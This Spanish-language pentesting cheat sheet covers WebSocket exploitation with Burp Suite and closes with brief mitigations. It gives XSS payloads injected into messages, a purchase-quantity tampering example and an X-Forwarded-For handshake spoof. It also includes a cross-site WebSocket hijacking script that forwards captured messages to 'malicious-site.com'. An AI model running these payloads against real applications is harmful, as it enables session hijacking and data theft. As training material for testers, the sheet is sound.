# 🧟‍♂️ Real World Payloads

## WebSockets Exploitation

### Interceptar y Modificar Mensajes WebSocket&#x20;

#### Proceso

1. **Abrir Burp Suite.**
2. Navega a la funcionalidad de la aplicación que utiliza WebSockets.
3. Habilita la interceptación en **Burp Proxy** y captura los mensajes WebSocket.
4. Modifica los mensajes según sea necesario y reenvíalos con el botón **Forward**.

**Ejemplo de Mensaje WebSocket Interceptado**

```json
{"message":"Hola Carlos"}
```

**Mensaje Modificado**

```json
{"message":"<img src=1 onerror='alert(1)'>"}
```

**Resultado**

El mensaje inyectado se muestra en el navegador del usuario objetivo, activando un XSS.

***

### Repetir y Generar Nuevos Mensajes WebSocket

#### Proceso

1. Captura un mensaje WebSocket en **Burp Proxy**.
2. Envía el mensaje a **Burp Repeater**.
3. Modifica el contenido y envíalo repetidamente al servidor.

**Ejemplo**

Mensaje capturado:

```json
{"action":"buy","item_id":123,"quantity":1}
```

Mensaje modificado:

```json
{"action":"buy","item_id":123,"quantity":999}
```

**Resultado Esperado**

Compra masiva de un producto no autorizado.

***

### Manipulación del Handshake WebSocket

#### Proceso

1. Captura el handshake en **Burp Proxy**.
2. Modifica los encabezados antes de reenviar la solicitud.

**Ejemplo de Handshake Modificado**

Solicitud original:

```http
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: abc123
Cookie: session=abc123
Upgrade: websocket
```

Modificación:

```http
X-Forwarded-For: 127.0.0.1
```

**Resultado Esperado**

Acceso a funcionalidades restringidas al cambiar el contexto de la conexión.

***

### Manipulación de Mensajes para Explotar Vulnerabilidades

#### Ejemplo: XSS en Mensajes WebSocket

1.  El atacante envía un mensaje WebSocket con contenido malicioso:

    ```json
    {"message":"<script>alert('XSS')</script>"}
    ```
2.  El mensaje se procesa y se muestra sin validación en el navegador del objetivo:

    ```html
    <td><script>alert('XSS')</script></td>
    ```

**Resultado**

El navegador del objetivo ejecuta el código malicioso.

***

### Secuestro de WebSocket entre Sitios

#### Proceso

1. Identifica un handshake WebSocket vulnerable a CSRF.
2. Crea un script en un dominio malicioso para establecer la conexión.

**Ejemplo de Script**

```javascript
var ws = new WebSocket('wss://vulnerable-website.com/chat');
ws.onopen = function() {
    ws.send("READY");
};
ws.onmessage = function(event) {
    fetch('https://malicious-site.com/log', {
        method: 'POST',
        body: event.data
    });
};
```

**Resultado Esperado**

El atacante accede a datos sensibles y puede interactuar con la aplicación en nombre del usuario objetivo.

***

### Mitigaciones

1. **Validación de Entrada:**
   * Implementar sanitización rigurosa en los datos enviados y recibidos.
2. **Protección contra CSRF:**
   * Usa tokens únicos en el handshake WebSocket.
3. **Restricciones de Origen:**
   * Configura políticas estrictas de CORS para conexiones WebSocket.
4. **Autenticación Adicional:**
   * Requiere tokens de sesión adicionales para establecer conexiones seguras.

***
